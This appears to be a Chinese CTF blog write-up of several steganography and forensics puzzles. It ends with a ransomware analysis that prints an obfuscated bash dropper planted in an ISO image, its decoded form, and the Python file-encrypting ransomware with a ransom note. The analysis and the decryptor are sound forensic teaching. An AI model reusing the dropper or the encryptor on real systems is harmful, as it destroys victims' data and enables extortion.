# 群友们问的一些来路不明的题

**其实感觉时常做做群友给的题，对自我实力提升其实帮助挺大的**
&lt;!--more--&gt;

{{&lt; admonition type=success title=&#34;阅前须知&#34; open=true &gt;}}

**因为本文的题目大都来源于群友的提问，因此我文章中就不放具体的附件下载链接了**

**如果有需要题目附件的师傅，可以进我的交流群获取附件下载链接^\_^**

{{&lt; /admonition &gt;}}

## 题目名称 大威天龙

题目附件给了一个DOC和一个加密的RAR压缩包

![](imgs/image-20241217162427407.png)

RAR压缩包的注释中有提示

![](imgs/image-20241217162453240.png)

然后用010打开那个doc，发现其实是一个ZIP压缩包

![](imgs/image-20241217162534874.png)

改后缀为.zip然后解压，在`gogog`路径下可以得到一张JPG图片

![](imgs/image-20241217162629300.jpeg)

结合之前RAR注释中的提示，猜测就是steghide隐写，因此我们直接使用stegseek进行爆破

![](imgs/image-20241217162848465.png)

可以得到一个txt文件，内容如下

![](imgs/image-20241217162955725.png)

因此压缩包解压密码就是：`恭喜你找到了rar压缩包的密码，快去解压吧！`

&gt; Tips:这里有的师傅用010打开会发现看不到中文，是因为这里使用的是GBK编码，可以使用记事本或者CyberChef查看

![](imgs/image-20241217163150370.png)

解压RAR压缩包后可以得到一张PNG图片和一个filename.c的代码

猜测图片被这个代码加密了，因此我们尝试逆向这个代码，结果发现原来的Python代码就写在注释里

![](imgs/image-20241217163442113.png)

![](imgs/image-20241217163637471.png)

因此直接写个脚本还原一下flag.png即可，还原后可以得到一张二维码

```python
from PIL import Image


img = Image.open(r&#34;out.png&#34;)
width,height = img.size
pix = img.load()

new_img = Image.new(&#34;RGBA&#34;, img.size)
new_pix = new_img.load()

for y in range(height):
    for x in range(width):
        b, a, r, g = pix[x, y]
        # 恢复亮度和对比度
        r = (r - 10) / 0.01
        g = (g - 10) / 0.01
        b = (b - 10) / 0.01
        a = (a - 10) / 0.01
        new_pix[x, y] = (int(r), int(g), int(b), int(a))

new_img.show()
new_img.save(r&#34;flag.png&#34;)
```

最后扫码即可得到flag：`flag{5fbb5f2b0f9234576d2742f225044463}`

![](imgs/image-20241217164317654.png)

## 题目名称 外星的凯撒凯撒凯撒

解压附件，可以得到一个DOCX还有一个加密的压缩包

![](imgs/image-20241217170952765.png)

打开DOCX文件，发现里面有一部分文字是白色的，直接全部修改为红色并去除所有格式

![](imgs/image-20241217171536175.png)

然后发现有很多行base64编码，猜测是base64隐写

![](imgs/image-20241217171656620.png)

直接PZ解base64隐写可以得到：`The ciphertext is:I0qwVtx2ft`

然后我们在DOCX中调大缩放，可以看到有一个4music.wav的图标，直接双击即可打开一个wav

![](imgs/image-20241217171854306.png)

播放发现是SSTV，扫描后可以得到密钥：`ccttttf`

![](imgs/image-20241217182044190.png)

![](imgs/image-20241217182052665.png)

然后维吉尼亚解密即可得到压缩包解压密码：`G0odCae2ar`

![](imgs/image-20241217182259005.png)

使用得到的密码解压压缩包后可以得到一个flag.xlsx

把后缀改为.zip然后解压，在sheet1.xml中可以发现有很多内容，因此猜测是设置了特殊格式

然后根据 400行x400列 猜测是藏了一个二维码

![](imgs/image-20241217182445544.png)

因此我们打开flag.xlsx文件，仔细观察发现有的单元格字体是加粗的，我们把加粗的单元格都涂黑

![](imgs/image-20241217182709212.png)

![](imgs/image-20241217182740720.png)

然后调整一下列宽得到一张二维码

![](imgs/image-20241217182855783.png)

最后扫码即可得到flag：`flag{Cae2ar&#43;Cae2ar&#43;Cae2ar&#43;...=Vigenre}`

![](imgs/image-20241217183113697.png)

## 题目名称 图的点很奇怪

题目附件给了一张PNG图片还有一个加密的ZIP压缩包，猜测需要从PNG图片中获取压缩包的解压密码

![](imgs/image-20241218193239301.png)

用010打开这张PNG图片，提示报错，仔细观察发现是图片chunk的CTYPE被修改了，尝试改回IDAT

![](imgs/image-20241218193434241.png)

然后发现图片末尾有多余的数据，尝试删除多余的数据

![](imgs/image-20241218193558124.png)

多余的数据删除后，图片就可以正常显示了，010中打开也没有报错了

放大图片查看，发现图片中有很多间隔相同的小点，猜测是隐写了另一张图片

![](imgs/image-20241218193727094.png)

因此我们尝试提取等距像素点，可以提取出来下面这张图片

![](imgs/image-20241218193916026.png)

因此压缩包的解压密码就是：`$df&amp;vK1RGqoj`，用得到的压缩包密码解压后可以得到下图

![](imgs/image-20241218194027697.png)

010打开上图，发现末尾藏了一张数据逆置后的PNG图片

![](imgs/image-20241218194114298.png)

直接把末尾的数据复制出来CyberChef转换一下即可得到flag：`flag{d4405ce1-3aac-ffb1-68af11-7d93e2066a}`

![](imgs/image-20241218194211209.png)

## 题目名称 cat(山东省&#34;技能兴鲁&#34;职业技能竞赛)

题目附件给了一个cat_encode.py还有一张cat.png

![](imgs/image-20241218194619452.png)

cat_encode.py的内容如下

```python
def arnold_encode(image, shuffle_times, a, b):
    arnold_image = np.zeros(shape=image.shape)
    h, w = image.shape[0], image.shape[1]
    N = h
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):

                new_x = (1*ori_x &#43; b*ori_y)% N
                new_y = (a*ori_x &#43; (a*b&#43;1)*ori_y) % N

                arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :]

        image = np.copy(arnold_image)
    cv2.imwrite(&#39;cat.png&#39;, arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])
    return arnold_image
```

很明显就是经典的arnold猫脸变换了，但是没有给我们shuffle_times、a、b

因此猜测需要我们进行爆破，编写以下脚本进行爆破即可，当然能爆破的前提是三个值都不会太大

```python
import matplotlib.pyplot as plt
import cv2
import numpy as np

def arnold_decode(image, shuffle_times, a, b):
    &#34;&#34;&#34; decode for rgb image that encoded by Arnold
    Args:
        image: rgb image encoded by Arnold
        shuffle_times: how many times to shuffle
    Returns:
        decode image
    &#34;&#34;&#34;
    # 1:创建新图像
    decode_image = np.zeros(shape=image.shape)
    # 2：计算N
    h, w = image.shape[0], image.shape[1]
    N = h  # 或N=w

    # 3：遍历像素坐标变换
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                # 按照公式坐标变换
                new_x = ((a * b &#43; 1) * ori_x &#43; (-b) * ori_y) % N
                new_y = ((-a) * ori_x &#43; ori_y) % N
                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]
        image = np.copy(decode_image)
        
    return image

def arnold_brute(image,shuffle_times_range,a_range,b_range):
    for c in range(shuffle_times_range[0],shuffle_times_range[1]):
        for a in range(a_range[0],a_range[1]):
            for b in range(b_range[0],b_range[1]):
                print(f&#34;[&#43;] Trying shuffle_times={c} a={a} b={b}&#34;)
                decoded_img = arnold_decode(image,c,a,b)
                output_filename = f&#34;flag_decodedc{c}_a{a}_b{b}.png&#34;
                cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])
                
if __name__ == &#34;__main__&#34;:
    img = cv2.imread(&#34;cat.png&#34;)
    arnold_brute(img, (1,6), (1,11), (1,11))
```

最后发现当shuffle_times=3、a=6、b=9时可以得到下图

![](imgs/image-20241218200611778.png)

因此最后的flag就是：`flag{022ae0e0-c61e-428c-9f76-2eb089a58348}`

## 题目名称 被偷梁换柱的镜像

题目背景如下：

&gt; 公司的运维人员使用了其U盘上的华为OpenEuler国产操作系统的ISO镜像，来给多台服务器安装系统，殊不知这些系统已经被悄悄的替换并嵌入了勒索病毒。。。多个月后，病毒偷偷的把数据加密了，你能帮忙分析并解密吗？

附件给了一个被加密的文件还有一个ISO镜像文件

ISO镜像直接双击挂载或者用Disk Genius挂载可以得到安装的镜像`install.img`

![](imgs/image-20241218131830249.png)

`install.img`因为系统格式不同，因此Windows下无法直接挂载

但是img镜像其实就是一个压缩包，用bandzip可能无法正常解压，但是我们可以使用7zip进行解压

第一层解压可以得到`rootfs.img`，再解压一层即可得到Linux的文件系统

![](imgs/image-20241218132121101.png)

然后我们在`\rootfs\var\adm`路径下可以得到一个`runrunrun.bash`，内容如下

```bash
z=&#34;
&#34;;lDz=&#39;Hz&#39;;Oz=&#39;id&#39;;VFz=&#39;y&#39;;jDz=&#39;$B&#39;;TCz=&#39;;G&#39;;MEz=&#39;gz&#39;;GDz=&#39;&#39;\&#39;&#39;j&#39;;az=&#39;&#34;&#39;;OCz=&#39;4&#39;\&#39;&#39;&#39;;ez=&#39;se&#39;;rDz=&#39;Mz&#39;;Vz=&#39;/n&#39;;XDz=&#39;&#39;\&#39;&#39;D&#39;;KEz=&#39;$d&#39;;Cz=&#39;UR&#39;;HEz=&#39;$b&#39;;dEz=&#39;Oz&#39;;IEz=&#39;cz&#39;;qz=&#39;if&#39;;eDz=&#39;z$&#39;;Fz=&#39;tt&#39;;XEz=&#39;$s&#39;;OFz=&#39;ch&#39;;kz=&#39; &#34;&#39;;IBz=&#39;=&#39;\&#39;&#39;&#39;;EEz=&#39;Vz&#39;;IDz=&#39; &#39;\&#39;&#39;&#39;;qBz=&#39;Uz&#39;;LEz=&#39;$f&#39;;TEz=&#39;nz&#39;;oz=&#39;RL&#39;;MBz=&#39;&#39;\&#39;&#39;;&#39;;cz=&#39;sp&#39;;tFz=&#39;at&#39;;lEz=&#39;GB&#39;;ACz=&#39;&#39;\&#39;&#39;v&#39;;oBz=&#39;;O&#39;;RBz=&#39;Gz&#39;;Jz=&#39;pi&#39;;kBz=&#39;Cz&#39;;JEz=&#39;$c&#39;;KFz=&#39;d &#39;;bEz=&#39;xz&#39;;VBz=&#39;m&#39;\&#39;&#39;&#39;;CDz=&#39;&#39;\&#39;&#39;X&#39;;wEz=&#39;si&#39;;vCz=&#39;tz&#39;;DBz=&#39; t&#39;;KDz=&#39;&#39;\&#39;&#39;F&#39;;UDz=&#39;;V&#39;;WBz=&#39;;B&#39;;dz=&#39;on&#39;;dDz=&#39;al&#39;;XFz=&#39;40&#39;;YEz=&#39;$u&#39;;SEz=&#39;$m&#39;;YBz=&#39;IB&#39;;DCz=&#39;CB&#39;;eEz=&#39;Lz&#39;;YDz=&#39;wz&#39;;ZFz=&#39;py&#39;;rCz=&#39;Wz&#39;;FEz=&#39;$Z&#39;;yDz=&#39;$U&#39;;TBz=&#39;;J&#39;;OBz=&#39;O&#39;\&#39;&#39;&#39;;xDz=&#39;$T&#39;;dFz=&#39;/r&#39;;EFz=&#39;/R&#39;;eBz=&#39;;k&#39;;YFz=&#39;0 &#39;;qEz=&#39;un&#39;;TDz=&#39;,&#39;\&#39;&#39;&#39;;Kz=&#39;.b&#39;;UCz=&#39;h&#39;\&#39;&#39;&#39;;jCz=&#39;jz&#39;;Ez=&#39;&#34;h&#39;;aDz=&#39;;P&#39;;pCz=&#39;;d&#39;;JCz=&#39;vz&#39;;PDz=&#39;M&#39;\&#39;&#39;&#39;;hCz=&#39;;m&#39;;iz=&#39;l &#39;;Iz=&#39;/a&#39;;mEz=&#39;$D&#39;;qCz=&#39;&#39;\&#39;&#39;c&#39;;ECz=&#39;&#39;\&#39;&#39;/&#39;;UEz=&#39;$o&#39;;XBz=&#39;&#39;\&#39;&#39;{&#39;;UFz=&#39;.p&#39;;iDz=&#39;Az&#39;;QEz=&#39;$k&#39;;cBz=&#39;;F&#39;;nz=&#39;_U&#39;;yBz=&#39;;H&#39;;bz=&#39;re&#39;;jz=&#39;-s&#39;;BBz=&#39;&#34; &#39;;tBz=&#39;&#39;\&#39;&#39;%&#39;;HDz=&#39;Fz&#39;;HBz=&#39;Jz&#39;;vEz=&#39;pa&#39;;HCz=&#39;;c&#39;;CCz=&#39;&#39;\&#39;&#39;)&#39;;eFz=&#39;oo&#39;;NFz=&#39;/.&#39;;sz=&#39;$r&#39;;hEz=&#39;$X&#39;;aEz=&#39;$w&#39;;sCz=&#39;x&#39;\&#39;&#39;&#39;;fFz=&#39;t/&#39;;BCz=&#39;DB&#39;;LCz=&#39;;S&#39;;rz=&#39; [&#39;;FBz=&#39;z=&#39;;tEz=&#39;-P&#39;;RDz=&#39;&#39;\&#39;&#39;7&#39;;OEz=&#39;$i&#39;;Az=&#39;AP&#39;;kCz=&#39;Z&#39;\&#39;&#39;&#39;;kEz=&#39;FB&#39;;uFz=&#39;e.&#39;;Sz=&#39;/c&#39;;SCz=&#39;~&#39;\&#39;&#39;&#39;;MFz=&#39;mp&#39;;bBz=&#39;a&#39;\&#39;&#39;&#39;;VEz=&#39;$p&#39;;lz=&#39;$A&#39;;gDz=&#39;$E&#39;;FFz=&#39;TL&#39;;VDz=&#39;&#39;\&#39;&#39;&#39;\&#39;&#39;&#39;;REz=&#39;lz&#39;;qDz=&#39;$M&#39;;sBz=&#39;;x&#39;;SBz=&#39;e&#39;\&#39;&#39;&#39;;eCz=&#39;&#39;\&#39;&#39;@&#39;;oCz=&#39;2&#39;\&#39;&#39;&#39;;Tz=&#39;he&#39;;fCz=&#39;yz&#39;;mDz=&#39;$I&#39;;JBz=&#39;l&#39;\&#39;&#39;&#39;;uz=&#39;po&#39;;RFz=&#39;up&#39;;BFz=&#39;fi&#39;;FCz=&#39;oz&#39;;SDz=&#39;uz&#39;;QCz=&#39;&#39;\&#39;&#39;9&#39;;IFz=&#39;in&#39;;aFz=&#39;th&#39;;YCz=&#39;&#39;\&#39;&#39;y&#39;;cCz=&#39;}&#39;\&#39;&#39;&#39;;DFz=&#39;wa&#39;;PFz=&#39;ec&#39;;RCz=&#39;Dz&#39;;aCz=&#39;&#39;\&#39;&#39;1&#39;;Rz=&#39;om&#39;;FDz=&#39;;n&#39;;nDz=&#39;$K&#39;;tDz=&#39;$O&#39;;ZEz=&#39;$v&#39;;CBz=&#39;];&#39;;iFz=&#39;an&#39;;cFz=&#39;y &#39;;ZDz=&#39;|&#39;\&#39;&#39;&#39;;jBz=&#39;&#39;\&#39;&#39;&#34;&#39;;iBz=&#39;;K&#39;;DDz=&#39;Rz&#39;;mFz=&#39; &amp;&#39;;Bz=&#39;I_&#39;;vDz=&#39;$Q&#39;;mBz=&#39;;A&#39;;EDz=&#39;\&#39;\&#39;&#39;&#39;;JDz=&#39;;f&#39;;LBz=&#39;&#39;\&#39;&#39;d&#39;;Wz=&#39;ee&#39;;XCz=&#39;;T&#39;;sDz=&#39;$N&#39;;ICz=&#39;&#39;\&#39;&#39;6&#39;;yEz=&#39;de&#39;;WDz=&#39;;Q&#39;;vz=&#39;ns&#39;;ODz=&#39;pz&#39;;Lz=&#39;ai&#39;;bDz=&#39;&#39;\&#39;&#39;L&#39;;pEz=&#39;z&#34;&#39;;NDz=&#39;&#39;\&#39;&#39;$&#39;;dCz=&#39;;M&#39;;kFz=&#39;ta&#39;;kDz=&#39;$G&#39;;Mz=&#39;du&#39;;yCz=&#39;Zz&#39;;PBz=&#39;;L&#39;;SFz=&#39;da&#39;;tz=&#39;es&#39;;ZCz=&#39;BB&#39;;xBz=&#39;#&#39;\&#39;&#39;&#39;;oDz=&#39;$L&#39;;MDz=&#39;t&#39;\&#39;&#39;&#39;;pz=&#39;&#34;)&#39;;mCz=&#39;&#39;\&#39;&#39;n&#39;;GCz=&#39;E&#39;\&#39;&#39;&#39;;AFz=&#39; /&#39;;PCz=&#39;;l&#39;;PEz=&#39;$j&#39;;xz=&#39; =&#39;;oEz=&#39;$h&#39;;DEz=&#39;$Y&#39;;vBz=&#39;&#39;\&#39;&#39;R&#39;;rFz=&#39;_u&#39;;UBz=&#39;Bz&#39;;jEz=&#39;$x&#39;;LDz=&#39;bz&#39;;QFz=&#39;k_&#39;;wBz=&#39;Nz&#39;;wz=&#39;e&#34;&#39;;oFz=&#39;10&#39;;hz=&#39;ur&#39;;WEz=&#39;Qz&#39;;fDz=&#39;$C&#39;;jFz=&#39;t_&#39;;nBz=&#39;b&#39;\&#39;&#39;&#39;;MCz=&#39;&#39;\&#39;&#39;`&#39;;WCz=&#39;3&#39;\&#39;&#39;&#39;;pDz=&#39;Kz&#39;;iEz=&#39;EB&#39;;KBz=&#39;;i&#39;;AEz=&#39;$V&#39;;gz=&#39;(c&#39;;cEz=&#39;$y&#39;;nEz=&#39;iz&#39;;uDz=&#39;Pz&#39;;Dz=&#39;L=&#39;;nFz=&#39;sl&#39;;rEz=&#39;zi&#39;;uCz=&#39;&#39;\&#39;&#39;z&#39;;lFz=&#39;/*&#39;;NEz=&#39;hz&#39;;pFz=&#39;tm&#39;;uBz=&#39;HB&#39;;xCz=&#39;&#39;\&#39;&#39;g&#39;;VCz=&#39;;E&#39;;Uz=&#39;ck&#39;;bCz=&#39;Ez&#39;;HFz=&#39;25&#39;;lBz=&#39;*&#39;\&#39;&#39;&#39;;CFz=&#39;rm&#39;;JFz=&#39; -&#39;;GFz=&#39;81&#39;;EBz=&#39;n&#39;;gBz=&#39;ez&#39;;qFz=&#39;p/&#39;;iCz=&#39;&#39;\&#39;&#39;I&#39;;TFz=&#39;te&#39;;ADz=&#39;i&#39;\&#39;&#39;&#39;;hDz=&#39;$F&#39;;wCz=&#39;;s&#39;;yz=&#39;= &#39;;GEz=&#39;az&#39;;WFz=&#39;mo&#39;;Gz=&#39;ps&#39;;mz=&#39;PI&#39;;sFz=&#39;pd&#39;;sEz=&#39;p &#39;;QDz=&#39;;X&#39;;Qz=&#39;.c&#39;;xEz=&#39;wo&#39;;fBz=&#39;&#39;\&#39;&#39;U&#39;;ABz=&#39;&#34;y&#39;;gFz=&#39;im&#39;;CEz=&#39;Xz&#39;;LFz=&#39;/t&#39;;dBz=&#39;Q&#39;\&#39;&#39;&#39;;GBz=&#39;&#34;;&#39;;Xz=&#39;d/&#39;;NBz=&#39;rz&#39;;Pz=&#39;ub&#39;;Zz=&#39;ed&#39;;BDz=&#39;;h&#39;;Nz=&#39;ba&#39;;ZBz=&#39;&#39;\&#39;&#39;-&#39;;QBz=&#39;&#39;\&#39;&#39;(&#39;;hFz=&#39;rt&#39;;bFz=&#39;3 &#39;;lCz=&#39;;a&#39;;tCz=&#39;;g&#39;;pBz=&#39;&#39;\&#39;&#39;s&#39;;cDz=&#39;ev&#39;;uEz=&#39; $&#39;;BEz=&#39;$W&#39;;gEz=&#39;$J&#39;;NCz=&#39;qz&#39;;nCz=&#39;Yz&#39;;fz=&#39;=$&#39;;fEz=&#39;$R&#39;;Hz=&#39;:/&#39;;hBz=&#39;G&#39;\&#39;&#39;&#39;;wDz=&#39;$S&#39;;gCz=&#39;&#43;&#39;\&#39;&#39;&#39;;aBz=&#39;Iz&#39;;Yz=&#39;lo&#39;;KCz=&#39;^&#39;\&#39;&#39;&#39;;rBz=&#39;p&#39;\&#39;&#39;&#39;;

echo &#34;$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Lz$Mz$Nz$Oz$Pz$Lz$Mz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Uz$Zz$az$z$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$z$qz$rz$kz$sz$tz$uz$vz$wz$xz$yz$ABz$tz$BBz$CBz$DBz$Tz$EBz$z$FBz$az$z$GBz$HBz$IBz$JBz$KBz$FBz$LBz$MBz$NBz$IBz$OBz$PBz$FBz$QBz$MBz$RBz$IBz$SBz$TBz$UBz$IBz$VBz$WBz$FBz$XBz$MBz$YBz$FBz$ZBz$MBz$aBz$IBz$bBz$cBz$UBz$IBz$dBz$eBz$FBz$fBz$MBz$gBz$IBz$hBz$iBz$FBz$jBz$MBz$kBz$IBz$lBz$mBz$UBz$IBz$nBz$oBz$FBz$pBz$MBz$qBz$IBz$rBz$sBz$FBz$tBz$MBz$uBz$FBz$vBz$MBz$wBz$IBz$xBz$yBz$FBz$ACz$MBz$BCz$FBz$CCz$MBz$DCz$FBz$ECz$MBz$FCz$IBz$GCz$HCz$FBz$ICz$MBz$JCz$IBz$KCz$LCz$FBz$MCz$MBz$NCz$IBz$OCz$PCz$FBz$QCz$MBz$RCz$IBz$SCz$TCz$UBz$IBz$UCz$VCz$UBz$IBz$WCz$XCz$FBz$YCz$MBz$ZCz$FBz$aCz$MBz$bCz$IBz$cCz$dCz$FBz$eCz$MBz$fCz$IBz$gCz$hCz$FBz$iCz$MBz$jCz$IBz$kCz$lCz$FBz$mCz$MBz$nCz$IBz$oCz$pCz$FBz$qCz$MBz$rCz$IBz$sCz$tCz$FBz$uCz$MBz$vCz$IBz$IBz$wCz$FBz$xCz$MBz$yCz$IBz$ADz$BDz$FBz$CDz$MBz$DDz$IBz$EDz$FDz$FBz$GDz$MBz$HDz$IBz$IDz$JDz$FBz$KDz$MBz$LDz$IBz$MDz$mBz$FBz$NDz$MBz$ODz$IBz$PDz$QDz$FBz$RDz$MBz$SDz$IBz$TDz$UDz$FBz$VDz$EDz$VDz$WDz$FBz$XDz$MBz$YDz$IBz$ZDz$aDz$FBz$bDz$MBz$z$cDz$dDz$kz$lz$eDz$UBz$fDz$eDz$RCz$gDz$eDz$HDz$hDz$eDz$iDz$jDz$eDz$kBz$gDz$eDz$HDz$kDz$eDz$lDz$lz$eDz$UBz$fDz$eDz$bCz$mDz$eDz$HBz$hDz$eDz$HDz$nDz$eDz$iDz$oDz$eDz$HDz$hDz$eDz$HDz$hDz$eDz$pDz$lz$eDz$UBz$qDz$eDz$RCz$gDz$eDz$pDz$hDz$eDz$iDz$jDz$eDz$rDz$sDz$eDz$aBz$tDz$eDz$uDz$vDz$eDz$DDz$wDz$eDz$rDz$xDz$eDz$bCz$hDz$eDz$HDz$yDz$eDz$iDz$AEz$eDz$DDz$BEz$eDz$CEz$DEz$eDz$EEz$FEz$eDz$GEz$HEz$eDz$iDz$AEz$eDz$DDz$BEz$eDz$IEz$JEz$eDz$EEz$hDz$eDz$pDz$KEz$eDz$gBz$LEz$eDz$MEz$mDz$eDz$NEz$OEz$eDz$lDz$PEz$eDz$gBz$QEz$eDz$REz$SEz$eDz$TEz$UEz$eDz$nCz$VEz$eDz$TEz$QEz$eDz$NCz$sz$eDz$WEz$XEz$eDz$NCz$SEz$eDz$TEz$tDz$eDz$vCz$nDz$eDz$HDz$hDz$eDz$iDz$jDz$eDz$rDz$YEz$eDz$bCz$hDz$eDz$HDz$nDz$eDz$iDz$jDz$eDz$rDz$ZEz$eDz$JCz$gDz$eDz$pDz$hDz$eDz$HDz$aEz$eDz$HDz$hDz$eDz$HDz$lz$eDz$UBz$fDz$eDz$bEz$sz$eDz$MEz$cEz$eDz$HBz$gDz$eDz$HDz$hDz$eDz$HDz$lz$UBz$AEz$eDz$EEz$mDz$eDz$dEz$AEz$eDz$EEz$kDz$eDz$iDz$oDz$eDz$eEz$hDz$eDz$HDz$hDz$eDz$eEz$oDz$eDz$ZCz$eDz$iDz$jDz$eDz$kBz$fDz$UBz$fEz$eDz$BCz$eDz$TEz$jDz$UBz$gEz$eDz$fCz$HEz$eDz$DCz$eDz$TEz$KEz$eDz$JCz$hEz$eDz$bCz$jDz$UBz$sDz$eDz$pDz$jDz$UBz$nDz$eDz$kBz$jDz$UBz$nDz$eDz$iEz$eDz$pDz$sDz$eDz$ZCz$eDz$BCz$eDz$fCz$gDz$UBz$nDz$eDz$wBz$nDz$eDz$pDz$jDz$UBz$nDz$eDz$pDz$lz$eDz$UBz$qDz$eDz$bEz$jEz$eDz$kEz$eDz$lEz$eDz$uBz$eDz$kEz$eDz$bCz$nDz$eDz$nCz$mEz$UBz$hDz$eDz$BCz$eDz$BCz$eDz$pDz$nDz$eDz$NCz$hDz$eDz$YBz$eDz$nEz$hDz$eDz$HDz$lz$eDz$UBz$qDz$eDz$bEz$sDz$eDz$lDz$gEz$UBz$oEz$eDz$uDz$fEz$eDz$BCz$eDz$wBz$gDz$eDz$HDz$hDz$eDz$HDz$hDz$eDz$BCz$eDz$pDz$hDz$eDz$HDz$nDz$eDz$iDz$jDz$eDz$rDz$YEz$eDz$bCz$nDz$pEz$z$qEz$rEz$sEz$tEz$uEz$vEz$wEz$xEz$yEz$AFz$BFz$CFz$DFz$bz$EFz$FFz$GFz$HFz$Kz$IFz$JFz$KFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$z$OFz$WFz$KFz$XFz$YFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$z$ZFz$aFz$dz$bFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$cFz$dFz$eFz$fFz$gFz$uz$hFz$iFz$jFz$SFz$kFz$lFz$mFz$z$nFz$Wz$sEz$oFz$z$CFz$AFz$pFz$qFz$Qz$Tz$Uz$rFz$sFz$tFz$uFz$ZFz$z$BFz&#34;
```

&gt; Tips：在做取证题过程中如果发现文件较多，其实可以把文件按照时间排序一下，这样可以大大缩短定位时间

是一个加了混淆的bash脚本，代码不长，我们可以手动解一下这个混淆

```bash
API_URL=&#34;https://api.baidubaidubaidubaidubaidu.com/check/need/locked&#34;
response=$(curl -s &#34;$API_URL&#34;)
if [ &#34;$response&#34; == &#34;yes&#34; ]; then
eval &#39;printf &#34;cGFzaXdvZGU9IjE2MjU4ODg4Ijs=&#34; |  base64 -d&#39;
unzip -P $pasiwode /firmware/RTL8125.bin -d /tmp/.check_update.py
chmod 400 /tmp/.check_update.py
python3 /tmp/.check_update.py /root/important_data/* &amp;
sleep 10
rm /tmp/.check_update.py
fi
```

其实就是base64解码得到压缩包解压密码：`16258888`，然后解压的过程，然后压缩包中的文件就是加密代码

![](imgs/image-20241218132440673.png)

因此我们接下来需要去找加密代码，发现7zip直接解压出来会丢失这部分的文件

![](imgs/image-20241218133417809.png)

所以我们使用`Disk Genius`的恢复文件功能去恢复加密的压缩包以及里面的加密代码

![](imgs/image-20241218132716931.png)

改后缀为.zip，然后使用得到的压缩包密码解压即可得到加密代码，内容如下：

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib
import time
import sys

NODecryptionForYouFFFFFFF = sys.argv[1]

def NODecryptionForYou1(NODecryptionForYou5):
    NODecryptionForYou6 = hashlib.md5(str(NODecryptionForYou5).encode(&#39;utf-8&#39;)).digest()
    return NODecryptionForYou6[:16]

def NODecryptionForYou2(NODecryptionForYou4, NODecryptionForYou11, NODecryptionForYou12):
    cipher = AES.new(NODecryptionForYou4, AES.MODE_CBC)
    with open(NODecryptionForYou11, &#39;rb&#39;) as NODecryptionForYouMAN8IN:
        NODecryptionForYou7 = NODecryptionForYouMAN8IN.read()
    NODecryptionForYou8 = cipher.iv &#43; cipher.encrypt(pad(NODecryptionForYou7, AES.block_size))
    with open(NODecryptionForYou12, &#39;wb&#39;) as NODecryptionForYouMAN8OUT:
        NODecryptionForYouMAN8OUT.write(NODecryptionForYou8)

NODecryptionForYou5 = int(time.time())
NODecryptionForYou4 = NODecryptionForYou1(NODecryptionForYou5)
NODecryptionForYou3 = f&#39;{NODecryptionForYou5}.locked&#39;
NODecryptionForYou2(NODecryptionForYou4, NODecryptionForYouFFFFFFF, NODecryptionForYou3)

print(&#34;SEND 1000 BTC TO [asdjjkh1iuhfihuiu1yrueo-this-is-fake-addr] for decryption, OR WE WILL LEAK ALL YOU DATA!!!&#34;)
```

代码逻辑并不复杂，就是用时间戳MD5值的前16位作为key去进行AES-CBC加密，然后IV保存在加密后文件的前16字节中

解密的思路也比较简单，懒得自己手写了，直接GPT秒了

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib

def NODecryptionForYou1(timestamp):
    # 通过时间戳生成密钥
    NODecryptionForYou6 = hashlib.md5(str(timestamp).encode(&#39;utf-8&#39;)).digest()
    return NODecryptionForYou6[:16]

def NODecryptionForYou2(key, enc_file, output_file):
    with open(enc_file, &#39;rb&#39;) as f:
        enc_data = f.read()
    
    # 从加密文件中提取 IV 和密文
    iv = enc_data[:16]  # 前 16 字节是 IV
    cipher_text = enc_data[16:]  # 剩下的是密文
    
    # 使用 AES CBC 模式进行解密
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size)
    
    # 将解密后的数据保存到输出文件
    with open(output_file, &#39;wb&#39;) as f:
        f.write(decrypted_data)

timestamp = 1732250675
key = NODecryptionForYou1(timestamp)
enc_file = f&#39;{timestamp}.locked&#39;  # 加密文件
output_file = f&#39;{timestamp}.decrypted&#39;  # 解密后的文件

NODecryptionForYou2(key, enc_file, output_file)

print(f&#34;File decrypted successfully! Output saved as {output_file}&#34;)
```

运行以上代码，发现解密后的文件是一个zip压缩包，因此改后缀位.zip并解压可以得到一个`重要数据.docx`

![](imgs/image-20241218133157811.png)

打开DOCX即可得到flag：`flag{851bd91f4a8168d2d719ab69eb1423f9}`

![](imgs/image-20241218133121093.png)



---

> Author: [Lunatic](https://goodlunatic.github.io)  
> URL: http://localhost:1313/posts/bb1da35/  

